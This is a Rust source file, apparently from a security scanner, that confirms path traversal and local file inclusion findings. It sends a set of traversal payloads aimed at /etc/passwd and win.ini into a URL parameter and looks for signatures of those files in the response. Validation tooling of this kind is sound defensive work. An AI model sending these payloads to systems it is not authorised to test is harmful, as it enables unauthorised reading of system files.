//! Path traversal / LFI: read canary files — real content must come back.

use crate::finding::{Finding, FindingClass};
use crate::probe::ProbeClient;
use crate::validator::Validator;
use crate::verdict::Verdict;
use std::collections::HashMap;

const FILE_SIGS: &[&str] = &[
    "root:x:", "root:*:", "daemon:", "[boot loader]", "[extensions]",
];

pub struct FilePathValidator {
    pub probe: ProbeClient,
}

#[async_trait::async_trait]
impl Validator for FilePathValidator {
    fn class(&self) -> FindingClass {
        FindingClass::FilePath
    }

    async fn validate(&self, f: &Finding) -> Verdict {
        let (Some(url), Some(param)) = (
            f.evidence["url"].as_str().map(|s| s.to_string()),
            f.evidence["param"].as_str().map(|s| s.to_string()),
        ) else {
            return Verdict::Rejected { reason: "evidence missing url/param".into() };
        };
        let send = |val: String| {
            let mut p = HashMap::new();
            p.insert(param.clone(), val);
            let (u, pp) = (url.clone(), p);
            let probe = self.probe.clone();
            async move { probe.get(&u, &pp).await }
        };

        let Ok(base) = send("nonexistent_aegis".into()).await else {
            return Verdict::Rejected { reason: "baseline probe failed".into() };
        };
        for payload in [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "/etc/passwd",
            "../../../../windows/win.ini",
        ] {
            if let Ok(r) = send(payload.to_string()).await {
                if let Some(sig) = FILE_SIGS.iter().find(|s| r.body.contains(**s) && !base.body.contains(**s)) {
                    return Verdict::Verified {
                        reproduction: format!(
                            "GET {url}?{param}={payload} -> file signature '{sig}' in response"
                        ),
                    };
                }
            }
        }
        Verdict::Rejected { reason: "no file content returned".into() }
    }
}
